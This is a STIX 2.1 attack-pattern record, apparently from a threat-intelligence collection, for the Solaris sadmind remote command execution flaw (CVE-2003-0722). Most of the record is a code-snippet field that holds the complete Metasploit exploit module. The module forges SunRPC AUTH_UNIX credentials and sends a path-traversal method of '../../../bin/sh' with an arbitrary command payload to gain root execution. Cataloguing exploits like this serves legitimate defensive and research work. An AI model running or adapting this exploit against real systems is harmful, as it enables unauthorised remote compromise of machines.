{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e812757c-223c-48fb-8793-9fb4ef3969e8",
    "created": "2024-08-14T16:33:48.464449Z",
    "modified": "2024-08-14T16:33:48.464453Z",
    "name": "Solaris sadmind Command Execution",
    "description": " This exploit targets a weakness in the default security settings of the sadmind RPC application. This server is installed and enabled by default on most versions of the Solaris operating system.  Vulnerable systems include solaris 2.7, 8, and 9 ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/solaris/sunrpc/sadmind_exec.rb",
            "external_id": "sadmind_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2003-0722"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::SunRPC\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Solaris sadmind Command Execution',\n      'Description'    => %q{\n          This exploit targets a weakness in the default security\n        settings of the sadmind RPC application. This server is\n        installed and enabled by default on most versions of the\n        Solaris operating system.\n\n        Vulnerable systems include solaris 2.7, 8, and 9\n      },\n      'Author'         => [ 'vlad902 <vlad902[at]gmail.com>', 'hdm', 'cazz', 'midnitesnake' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2003-0722'],\n          ['OSVDB', '4585'],\n          ['BID', '8615']\n        ],\n      'Privileged'     => true,\n      'Platform'       => %w{ solaris unix },\n      'Arch'           => ARCH_CMD,\n      'Payload'        =>\n        {\n          'Space'       => 2000,\n          'BadChars'    => \"\\x00\",\n          'DisableNops' => true,\n          'EncoderType' => Msf::Encoder::Type::CmdUnixPerl,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl telnet',\n            }\n        },\n      'Targets'        => [ ['Automatic', { }], ],\n      'DisclosureDate' => '2003-09-13',\n      'DefaultTarget' => 0\n    ))\n\n    register_options(\n      [\n        OptString.new('HOSTNAME', [false, 'Remote hostname', nil]),\n        OptInt.new('GID', [false, 'GID to emulate', 0]),\n        OptInt.new('UID', [false, 'UID to emulate', 0])\n      ], self.class\n    )\n  end\n\n  def exploit\n    sunrpc_create('udp', 100232, 10)\n    sunrpc_authunix('localhost', datastore['UID'], datastore['GID'], [])\n\n    if !datastore['HOSTNAME']\n      print_status('attempting to determine hostname')\n      response = sadmind_request(rand_text_alpha(rand(10) + 1), \"true\")\n\n      if !response\n        print_error('no response')\n        return\n      end\n\n      match = /Security exception on host (.*)\\.  USER/.match(response)\n      if match\n        hostname = match.captures[0]\n        print_status(\"found hostname: #{hostname}\")\n      else\n        print_error('unable to determine hostname')\n        return\n      end\n    else\n      hostname = datastore['HOSTNAME']\n    end\n\n    sunrpc_authunix(hostname, datastore['UID'], datastore['GID'], [])\n    response = sadmind_request(hostname, payload.encoded)\n    sunrpc_destroy\n\n    if /Security exception on host/.match(response)\n      print_error('exploit failed')\n      return\n    else\n      print_status('exploit did not give us an error, this is good...')\n      select(nil,nil,nil,1)\n      handler\n    end\n  end\n\n  def sadmind_request(host, command)\n    header =\n      Rex::Encoder::XDR.encode(0) * 7 +\n      Rex::Encoder::XDR.encode(6, 0, 0, 0, 4, 0, 4, 0x7f000001, 100232, 10,\n        4, 0x7f000001, 100232, 10, 17, 30, 0, 0, 0, 0,\n        host, 'system', '../../../bin/sh')\n\n    body =\n      do_int('ADM_FW_VERSION', 1) +\n      do_string('ADM_LANG', 'C') +\n      do_string('ADM_REQUESTID', '00009:000000000:0') +\n      do_string('ADM_CLASS', 'system') +\n      do_string('ADM_CLASS_VERS', '2.1') +\n      do_string('ADM_METHOD', '../../../bin/sh') +\n      do_string('ADM_HOST', host) +\n      do_string('ADM_CLIENT_HOST', host) +\n      do_string('ADM_CLIENT_DOMAIN', '') +\n      do_string('ADM_TIMEOUT_PARMS', 'TTL=0 PTO=20 PCNT=2 PDLY=30') +\n      do_int('ADM_FENCE', 0) +\n      do_string('X', '-c') +\n      do_string('Y', command) +\n      Rex::Encoder::XDR.encode('netmgt_endofargs')\n\n    request = header + Rex::Encoder::XDR.encode(header.length + body.length - 326) + body\n\n    ret = sunrpc_call(1, request)\n    return Rex::Encoder::XDR.decode!(ret, Integer, Integer, String)[2]\n  end\n\n  def do_string(str1, str2)\n    Rex::Encoder::XDR.encode(str1, 9, str2.length + 1, str2, 0, 0)\n  end\n\n  def do_int(str, int)\n    Rex::Encoder::XDR.encode(str, 3, 4, int, 0, 0)\n  end\nend\n",
    "x_mitre_disclosure_date": "2003-09-13",
    "x_mitre_platforms": [
        "%w{ solaris unix }"
    ]
}